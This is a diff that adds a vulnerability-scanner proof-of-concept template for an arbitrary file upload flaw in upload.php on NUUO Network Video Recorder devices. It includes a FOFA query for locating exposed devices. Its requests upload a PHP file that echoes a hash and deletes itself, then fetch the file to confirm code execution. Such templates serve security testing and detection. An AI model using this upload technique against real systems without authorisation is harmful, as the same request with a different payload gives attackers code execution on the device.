@@ -1,0 +1,29 @@
+id: poc-yaml-nuuo-network-video-recorder-upload-php-anyfile-upload
+info:
+  name: NUUO Network Video Recorder upload.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: network_video_recorder
+  fofa: body="NUUO" && title="Network Video Recorder Login"
+variables:
+  t1: random_int(100,1000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /upload.php
+  headers:
+    Content-Type: multipart/form-data; boundary=--------ok4o88lom
+  data: '----------ok4o88lom
+
+    Content-Disposition: form-data; name="userfile"; filename="{{.t1}}.php"
+
+
+    <?php echo md5({{.t1}});@unlink(__FILE__);?>
+
+    ----------ok4o88lom--'
+  expression: status_code == 200 && contains(body,t1 + ".php") && !contains(body,"<")
+- method: GET
+  path: /{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
